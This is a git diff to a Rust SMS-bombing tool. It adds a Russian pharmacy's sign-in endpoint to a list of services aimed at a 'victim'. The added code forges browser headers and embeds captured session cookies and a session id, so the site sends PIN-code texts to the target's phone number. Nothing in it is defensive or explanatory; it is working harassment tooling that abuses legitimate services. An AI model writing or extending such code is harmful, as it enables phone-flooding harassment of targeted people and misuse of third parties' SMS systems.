@@ -1,4 +1,4 @@
-use crate::phone::FormatterTypes::{WithPlusBracketsHyphen, Without7};
+use crate::phone::FormatterTypes::{WithPlusBracketsHyphen, WithPlusBracketsHyphen2, Without7};
 use crate::phone::{Country, FormatterTypes::WithPlus, Phone};
 use reqwest::header::HeaderMap;
 use reqwest::Method;
@@ -171,6 +171,81 @@ pub async fn construct_services_list(victim: Victim) -> Vec<Service> {
                     "token": "nocaptchatoken",
                     "sendBy": "CASCADE",
                     "action": "SENT_PIN_CODE"
+                });
+
+                services.push(service);
+            }
+            // Planetazdorovo
+            {
+                let mut service = Service {
+                    name: "Planetazdorovo".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://planetazdorovo.ru/ajax/vigroup-p_a.php".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"planetazdorovo.ru"#.parse().unwrap());
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("Accept", r#"*/*"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Content-Type",
+                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://planetazdorovo.ru"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert(
+                    "Referer",
+                    r#"https://planetazdorovo.ru/lk/signin/"#.parse().unwrap(),
+                );
+                service.headers.insert("Cookie", r#"qrator_jsr=1735553179.257.ZZ6EkCAWEXWxUcNl-d1vf6qcoejoj6rpvmb8b8rhr9jt9dl7q-00; qrator_jsid=1735553179.257.ZZ6EkCAWEXWxUcNl-racb67mvafsbqjon13650670knfk353f; city_id=749807; city_xml=363; city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B8%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C; city_code=moskva-i-mo; help_phone=%28495%29%20369-33-00; order_phone=8%20%28495%29%20145-99-33; region=12; timezone=10800; show_bonus=1; region_id=16; PHPSESSID=smyk77Kdb92cvkP3g5qs6NmFwAh8gpcO; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A18%2C%22EXPIRE%22%3A1735585140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"planetazdorovo.ru"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlusBracketsHyphen2);
+                service.body = json!({
+                    "sessid": "3b02e3dbcc611f4a134b682e9cecb927",
+                    "phone": phone.phone,
+                    "Login": ""
                 });
 
                 services.push(service);
